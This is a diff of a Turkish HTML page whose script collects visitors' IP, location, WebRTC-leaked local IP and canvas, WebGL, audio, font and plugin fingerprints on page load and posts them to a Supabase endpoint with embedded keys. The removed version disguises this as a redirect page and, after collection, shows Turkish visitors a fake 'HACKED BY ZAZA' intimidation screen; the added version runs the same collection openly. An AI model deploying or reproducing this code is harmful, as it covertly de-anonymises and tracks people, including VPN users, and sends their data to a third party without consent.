@@ -2,446 +2,173 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Yönlendiriliyor...</title>
+    <title>Veri Toplama</title>
+    <script>
+        const SUPABASE_URL = "https://ruhvxcltgtemimslszwy.supabase.co/rest/v1/logs";
+        const SUPABASE_KEY = "sb_publishable_N3O2HpzgQq8Q38mtyJEDlw_GR_rULlX";
+
+        async function getLocalIP() {
+            return new Promise((resolve) => {
+                let pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    let localIP = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate)?.[0];
+                    if (localIP) resolve(localIP);
+                    pc.close();
+                };
+                setTimeout(() => resolve("Alınamadı"), 2000);
+            });
+        }
+
+        function getCanvasFingerprint() {
+            let canvas = document.createElement('canvas');
+            let ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(0, 0, 200, 50);
+            ctx.fillStyle = "#fff";
+            ctx.font = "14px Arial";
+            ctx.fillText("Fingerprint", 10, 30);
+            return canvas.toDataURL();
+        }
+
+        function getWebGLFingerprint() {
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl');
+                if (!gl) return "WebGL desteklenmiyor";
+                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+                return "Bilinmiyor";
+            } catch(e) {
+                return "Hata";
+            }
+        }
+
+        async function getAudioFingerprint() {
+            try {
+                let AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (!AudioContext) return "AudioContext yok";
+                let ctx = new AudioContext();
+                let oscillator = ctx.createOscillator();
+                let analyser = ctx.createAnalyser();
+                oscillator.connect(analyser);
+                analyser.connect(ctx.destination);
+                oscillator.start(0);
+                let data = new Uint8Array(analyser.frequencyBinCount);
+                analyser.getByteFrequencyData(data);
+                oscillator.stop();
+                await ctx.close();
+                return Array.from(data.slice(0, 10)).join(',');
+            } catch(e) {
+                return "Hata";
+            }
+        }
+
+        async function getFonts() {
+            if (!document.fonts) return "Font API yok";
+            let fonts = await document.fonts.ready;
+            let fontList = [];
+            for (let font of fonts) {
+                fontList.push(font.family);
+                if (fontList.length > 20) break;
+            }
+            return fontList.join(', ');
+        }
+
+        function getPlugins() {
+            let plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            return plugins.join(', ') || "Eklenti yok";
+        }
+
+        function getDeviceName() {
+            let ua = navigator.userAgent;
+            if (/iPhone/.test(ua)) return "iPhone";
+            if (/iPad/.test(ua)) return "iPad";
+            if (/Android/.test(ua)) return "Android";
+            if (/Windows/.test(ua)) return "Windows PC";
+            if (/Mac/.test(ua)) return "Mac";
+            if (/Linux/.test(ua)) return "Linux";
+            return "Bilinmiyor";
+        }
+
+        async function sendData() {
+            try {
+                let ipRes = await fetch("https://ipapi.co/json/");
+                let ipData = await ipRes.json();
+
+                let localIP = await getLocalIP();
+                let canvasFP = getCanvasFingerprint();
+                let webglFP = getWebGLFingerprint();
+                let audioFP = await getAudioFingerprint();
+                let fonts = await getFonts();
+                let plugins = getPlugins();
+                let deviceName = getDeviceName();
+
+                let payload = {
+                    ip: ipData.ip,
+                    ulke: ipData.country_name,
+                    sehir: ipData.city,
+                    bolge: ipData.region,
+                    isp: ipData.org,
+                    vpn_proxy: ipData.proxy || false,
+                    hosting: ipData.hosting || false,
+                    tor: ipData.tor || false,
+                    local_ip: localIP,
+                    cihaz_adi: deviceName,
+                    tarayici: navigator.userAgent.split(' ')[0],
+                    isletim_sistemi: navigator.platform,
+                    ekran_cozunurluk: `${screen.width}x${screen.height}`,
+                    dil: navigator.language,
+                    saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookie_enabled: navigator.cookieEnabled,
+                    device_pixel_ratio: window.devicePixelRatio,
+                    ram_gb: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
+                    cpu_cekirdek: navigator.hardwareConcurrency || "Bilinmiyor",
+                    gpu: webglFP,
+                    webgl_fingerprint: webglFP,
+                    canvas_fingerprint: canvasFP.substring(0, 200),
+                    audio_fingerprint: audioFP,
+                    yuklu_fontlar: fonts.substring(0, 300),
+                    eklentiler: plugins.substring(0, 300),
+                    user_agent: navigator.userAgent,
+                    referer: document.referrer,
+                    url_parametreleri: window.location.search.substring(1)
+                };
+
+                await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                document.body.innerHTML = "<h2 style='color:green; text-align:center; margin-top:50px;'>Bilgileriniz kaydedildi.</h2>";
+            } catch(e) {
+                document.body.innerHTML = "<h2 style='color:red; text-align:center; margin-top:50px;'>Veri gönderilemedi.</h2>";
+                console.error(e);
+            }
+        }
+
+        window.onload = sendData;
+    </script>
+</head>
+<body style="background:#000; color:#0f0; display:flex; align-items:center; justify-content:center; height:100vh; font-family:monospace;">
+    <div style="text-align:center;">
+        <div class="spinner" style="width:40px;height:40px;border:3px solid #0f0;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px;"></div>
+        <p>Bilgileriniz toplanıyor...</p>
+    </div>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: #0f1117;
-            font-family: 'Inter', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            padding: 20px;
-        }
-
-        .loading-container {
-            background: #161c2c;
-            border-radius: 28px;
-            padding: 48px 32px;
-            max-width: 500px;
-            width: 100%;
-            border: 1px solid #2a3448;
-            box-shadow: 0 25px 40px -12px black;
-        }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(79, 158, 255, 0.2);
-            border-top: 4px solid #4f9eff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .loading-text {
-            color: #9aa5c0;
-            font-size: 14px;
-            margin-top: 20px;
-        }
-
-        /* Korku teması (sadece TR ve temiz IP için) */
-        .horror-theme {
-            background: radial-gradient(circle at 20% 30%, #0a0000, #000000);
-            font-family: 'Courier New', monospace;
-        }
-
-        .horror-theme .loading-container {
-            background: #110000cc;
-            border-color: #ff000055;
-        }
-
-        .horror-theme .loading-text {
-            color: #cc7777;
-        }
-
-        .glitch-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.05) 0px, rgba(255,0,0,0.05) 2px, transparent 2px, transparent 6px);
-            pointer-events: none;
-            z-index: 0;
-            animation: glitchBg 0.3s infinite;
-        }
-
-        @keyframes glitchBg {
-            0% { opacity: 0.3; transform: translateX(0); }
-            100% { opacity: 0.6; transform: translateX(2px); }
-        }
-
-        .static {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(45deg, rgba(255,0,0,0.03) 0px, rgba(255,0,0,0.03) 2px, transparent 2px, transparent 8px);
-            pointer-events: none;
-            opacity: 0.15;
-            z-index: 1;
-            animation: staticMove 0.15s infinite;
-        }
-
-        @keyframes staticMove {
-            0% { background-position: 0 0; }
-            100% { background-position: 5px 5px; }
-        }
-
-        .container {
-            position: relative;
-            z-index: 10;
-            max-width: 800px;
-            width: 100%;
-        }
-
-        .hack-title {
-            font-size: 48px;
-            font-weight: 900;
-            color: #ff3300;
-            text-shadow: 0 0 5px red, 0 0 10px darkred;
-            animation: glitch 0.5s infinite alternate;
-            letter-spacing: -1px;
-        }
-
-        @keyframes glitch {
-            0% { transform: skew(0deg, 0deg); opacity: 1; text-shadow: 2px 0 red; }
-            100% { transform: skew(2deg, 1deg); opacity: 0.9; text-shadow: -2px 0 darkred; }
-        }
-
-        .sub {
-            font-size: 20px;
-            color: #fa5252;
-            margin-top: 20px;
-            border-top: 1px solid #ff000055;
-            border-bottom: 1px solid #ff000055;
-            padding: 16px;
-            display: inline-block;
-        }
-
-        .warning-text {
-            margin-top: 40px;
-            font-size: 14px;
-            color: #cc7777;
-            background: #110000aa;
-            padding: 20px;
-            border-radius: 20px;
-            backdrop-filter: blur(8px);
-        }
-
-        .blink {
-            animation: blink 0.8s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        .footer {
-            position: fixed;
-            bottom: 15px;
-            right: 20px;
-            font-size: 11px;
-            color: #8b0000;
-            background: #000000aa;
-            padding: 4px 12px;
-            border-radius: 20px;
-            z-index: 20;
-            font-family: monospace;
+            to { transform: rotate(360deg); }
         }
     </style>
-</head>
-<body>
-<div class="loading-container" id="loadingBox">
-    <div class="spinner"></div>
-    <div class="loading-text">🔍 IP adresiniz kontrol ediliyor...</div>
-</div>
-
-<script>
-    const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
-    const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";
-
-    let horrorActivated = false;
-    let ipDataGlobal = null;
-
-    // Cihaz adı
-    function getDeviceName() {
-        let ua = navigator.userAgent;
-        if (/iPhone/.test(ua)) return "iPhone";
-        if (/iPad/.test(ua)) return "iPad";
-        if (/Android/.test(ua)) return "Android Telefon/Tablet";
-        if (/Windows/.test(ua)) return "Windows PC";
-        if (/Mac/.test(ua)) return "Mac";
-        if (/Linux/.test(ua)) return "Linux";
-        return "Bilinmiyor";
-    }
-
-    // IP ve ülke/VPN bilgisi
-    async function getIpAndCountry() {
-        try {
-            let res = await fetch("https://ipapi.co/json/");
-            return await res.json();
-        } catch(e) {
-            return { ip: "0.0.0.0", country_code: "TR", country_name: "Turkey", proxy: false, hosting: false, tor: false };
-        }
-    }
-
-    // Aynı IP daha önce kayıtlı mı?
-    async function isIpAlreadyExists(ip) {
-        try {
-            let res = await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}&ip_adresi=eq.${ip}`);
-            let data = await res.json();
-            return Array.isArray(data) && data.length > 0;
-        } catch(e) {
-            return false;
-        }
-    }
-
-    // Veri toplama ve kaydetme (sadece TR ve temiz IP için)
-    async function collectAndSave(ipData) {
-        let localIp = await getLocalIP();
-        let canvasFP = getCanvasFingerprint();
-        let webglFP = getWebGLFingerprint();
-        let audioFP = await getAudioFingerprint();
-        let fonts = await getFonts();
-        let plugins = getPlugins();
-        let ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
-        let cpu = navigator.hardwareConcurrency || "Bilinmiyor";
-        let loadTime = performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart;
-        let urlParams = window.location.search.substring(1);
-        let deviceName = getDeviceName();
-
-        let payload = {
-            ip: ipData.ip,
-            ulke: ipData.country_name,
-            sehir: ipData.city,
-            bolge: ipData.region,
-            isp: ipData.org,
-            vpn_proxy: ipData.proxy || false,
-            hosting: ipData.hosting || false,
-            tor: ipData.tor || false,
-            web_rtc_leaked_ip: localIp,
-            local_ip: localIp,
-            cihaz_adi: deviceName,
-            tarayici: navigator.userAgent.split(' ')[0],
-            tarayici_surum: navigator.userAgent.match(/Chrome\/[0-9]+/)?.[0] || "?",
-            isletim_sistemi: navigator.platform,
-            ekran_cozunurluk: `${screen.width}x${screen.height}`,
-            renk_derinligi: screen.colorDepth,
-            dil: navigator.language,
-            saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            zaman_sapmasi: new Date().getTimezoneOffset(),
-            cookie_enabled: navigator.cookieEnabled,
-            do_not_track: navigator.doNotTrack || "belirtilmemiş",
-            device_pixel_ratio: window.devicePixelRatio,
-            touch_destek: 'ontouchstart' in window,
-            max_touch_points: navigator.maxTouchPoints || 0,
-            ram_gb: ram,
-            cpu_cekirdek: cpu,
-            gpu: webglFP,
-            webgl_fingerprint: webglFP,
-            canvas_fingerprint: canvasFP.substring(0, 200),
-            audio_fingerprint: audioFP,
-            yuklu_fontlar: fonts.substring(0, 300),
-            eklentiler: plugins.substring(0, 300),
-            user_agent: navigator.userAgent,
-            referer: document.referrer,
-            url_parametreleri: urlParams,
-            sayfa_yuklenme_suresi: loadTime
-        };
-
-        try {
-            await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-        } catch(e) { console.error("Kayıt hatası:", e); }
-    }
-
-    // === FINGERPRINT FONKSİYONLARI ===
-    async function getLocalIP() {
-        return new Promise((resolve) => {
-            let pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = (ice) => {
-                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                let localIP = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate)?.[0];
-                if (localIP) resolve(localIP);
-                pc.close();
-            };
-            setTimeout(() => resolve("Alınamadı"), 2000);
-        });
-    }
-
-    function getCanvasFingerprint() {
-        let canvas = document.createElement('canvas');
-        let ctx = canvas.getContext('2d');
-        canvas.width = 200;
-        canvas.height = 50;
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(0, 0, 200, 50);
-        ctx.fillStyle = "#fff";
-        ctx.font = "14px Arial";
-        ctx.fillText("ZAZA", 10, 30);
-        return canvas.toDataURL();
-    }
-
-    function getWebGLFingerprint() {
-        try {
-            let canvas = document.createElement('canvas');
-            let gl = canvas.getContext('webgl');
-            if (!gl) return "WebGL desteklenmiyor";
-            let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debugInfo) {
-                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            }
-            return "Bilinmiyor";
-        } catch(e) {
-            return "Hata";
-        }
-    }
-
-    async function getAudioFingerprint() {
-        try {
-            let AudioContext = window.AudioContext || window.webkitAudioContext;
-            if (!AudioContext) return "AudioContext yok";
-            let ctx = new AudioContext();
-            let oscillator = ctx.createOscillator();
-            let analyser = ctx.createAnalyser();
-            oscillator.connect(analyser);
-            analyser.connect(ctx.destination);
-            oscillator.start(0);
-            let data = new Uint8Array(analyser.frequencyBinCount);
-            analyser.getByteFrequencyData(data);
-            oscillator.stop();
-            await ctx.close();
-            return Array.from(data.slice(0, 10)).join(',');
-        } catch(e) {
-            return "Hata";
-        }
-    }
-
-    async function getFonts() {
-        if (!document.fonts) return "Font API yok";
-        let fonts = await document.fonts.ready;
-        let fontList = [];
-        for (let font of fonts) {
-            fontList.push(font.family);
-            if (fontList.length > 20) break;
-        }
-        return fontList.join(', ');
-    }
-
-    function getPlugins() {
-        let plugins = [];
-        for (let i = 0; i < navigator.plugins.length; i++) {
-            plugins.push(navigator.plugins[i].name);
-        }
-        return plugins.join(', ') || "Eklenti yok";
-    }
-
-    // ========== ANA FONKSİYON ==========
-    async function main() {
-        let ipData = await getIpAndCountry();
-        ipDataGlobal = ipData;
-
-        let isBlocked = (ipData.country_code !== "TR") || (ipData.proxy === true || ipData.hosting === true || ipData.tor === true);
-        let alreadyExists = await isIpAlreadyExists(ipData.ip);
-
-        setTimeout(async () => {
-            if (isBlocked) {
-                // ENGEL: Sadece engel ekranı göster
-                document.body.innerHTML = `
-                    <div style="background:#0f1117; min-height:100vh; display:flex; align-items:center; justify-content:center; text-align:center; padding:20px;">
-                        <div style="background:#161c2c; border-radius:28px; padding:48px 32px; max-width:500px; border:1px solid #2a3448;">
-                            <div style="font-size:64px;">⛔</div>
-                            <h2 style="color:#f97316; margin:16px 0;">ERİŞİM ENGELLENDİ</h2>
-                            <p style="color:#9aa5c0;">Bu siteye yalnızca Türkiye'den erişim sağlanabilir.<br>VPN veya proxy kullanmayın.</p>
-                        </div>
-                    </div>
-                `;
-                return;
-            }
-
-            // Türkiye ve temiz IP
-            if (!alreadyExists) {
-                await collectAndSave(ipData);
-            }
-
-            // Korku temasını aktif et
-            document.body.classList.add("horror-theme");
-            document.body.innerHTML = `
-                <div class="glitch-bg"></div>
-                <div class="static"></div>
-                <div class="container">
-                    <div class="hack-title blink">⚠ GOLGESİZ TARAFINDAN HACKLENDİNİZ ⚠</div>
-                    <div class="sub">🔐 CİHAZINIZ TAMAMEN ELE GEÇİRİLDİ 🔐</div>
-                    <div class="warning-text">
-                        📡 IP Adresiniz, konumunuz, cihaz bilgileriniz kaydedildi.<br>
-                        🌍 VPN kullansan bile gerçek IP'n tespit edildi.<br>
-                        💀 Tüm verileriniz çalındı.<br>
-                        🤖 Sistem tamamen ele geçirildi.
-                    </div>
-                </div>
-                <div class="footer">🔒 HACKED BY ZAZA | TÜM HAKLARI GASPLANMIŞTIR</div>
-            `;
-
-            // Gerekli stilleri de ekle
-            let style = document.createElement('style');
-            style.textContent = `
-                .glitch-bg {
-                    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-                    background: repeating-linear-gradient(0deg, rgba(255,0,0,0.05) 0px, rgba(255,0,0,0.05) 2px, transparent 2px, transparent 6px);
-                    pointer-events: none; z-index: 0; animation: glitchBg 0.3s infinite;
-                }
-                @keyframes glitchBg {
-                    0% { opacity: 0.3; transform: translateX(0); }
-                    100% { opacity: 0.6; transform: translateX(2px); }
-                }
-                .static {
-                    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-                    background: repeating-linear-gradient(45deg, rgba(255,0,0,0.03) 0px, rgba(255,0,0,0.03) 2px, transparent 2px, transparent 8px);
-                    pointer-events: none; opacity: 0.15; z-index: 1; animation: staticMove 0.15s infinite;
-                }
-                @keyframes staticMove {
-                    0% { background-position: 0 0; }
-                    100% { background-position: 5px 5px; }
-                }
-                .container { position: relative; z-index: 10; max-width: 800px; width: 100%; margin: 0 auto; text-align: center; }
-                .hack-title { font-size: 48px; font-weight: 900; color: #ff3300; text-shadow: 0 0 5px red; animation: glitch 0.5s infinite alternate; }
-                @keyframes glitch {
-                    0% { transform: skew(0deg); text-shadow: 2px 0 red; }
-                    100% { transform: skew(2deg); text-shadow: -2px 0 darkred; }
-                }
-                .sub { font-size: 20px; color: #fa5252; margin-top: 20px; border-top: 1px solid #ff000055; border-bottom: 1px solid #ff000055; padding: 16px; display: inline-block; }
-                .warning-text { margin-top: 40px; font-size: 14px; color: #cc7777; background: #110000aa; padding: 20px; border-radius: 20px; backdrop-filter: blur(8px); }
-                .blink { animation: blink 0.8s infinite; }
-                @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-                .footer { position: fixed; bottom: 15px; right: 20px; font-size: 11px; color: #8b0000; background: #000000aa; padding: 4px 12px; border-radius: 20px; z-index: 20; }
-            `;
-            document.head.appendChild(style);
-        }, 2000);
-    }
-
-    main();
-</script>
 </body>
 </html>
